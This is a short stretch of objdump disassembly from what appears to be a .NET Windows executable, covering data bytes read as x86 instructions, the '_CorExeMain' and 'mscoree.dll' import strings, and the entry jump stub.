  40d0a5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0ab:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0b0:	12 61 11             	adc    0x11(%ecx),%ah
  40d0b3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0b7:	04 12                	add    $0x12,%al
  40d0b9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0c0:	1d 05 00 
  40d0c3:	00 ec                	add    %ch,%ah
  40d0c5:	d0 00                	rolb   $1,(%eax)
	...
  40d0cf:	00 0e                	add    %cl,(%esi)
  40d0d1:	d1 00                	roll   $1,(%eax)
  40d0d3:	00 00                	add    %al,(%eax)
  40d0d5:	20 00                	and    %al,(%eax)
	...
  40d0eb:	00 00                	add    %al,(%eax)
  40d0ed:	d1 00                	roll   $1,(%eax)
	...
  40d0ff:	00 00                	add    %al,(%eax)
  40d101:	00 5f 43             	add    %bl,0x43(%edi)
  40d104:	6f                   	outsl  %ds:(%esi),(%dx)
  40d105:	72 45                	jb     0x40d14c
  40d107:	78 65                	js     0x40d16e
  40d109:	4d                   	dec    %ebp
  40d10a:	61                   	popa
  40d10b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d112:	72 65                	jb     0x40d179
  40d114:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d118:	6c                   	insb   (%dx),%es:(%edi)
  40d119:	00 00                	add    %al,(%eax)
  40d11b:	00 00                	add    %al,(%eax)
  40d11d:	00 ff                	add    %bh,%bh
  40d11f:	25 00 20 40 00       	and    $0x402000,%eax
